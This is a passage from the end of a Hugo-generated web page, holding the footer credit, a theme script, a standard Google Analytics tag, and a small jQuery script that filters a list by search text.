Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>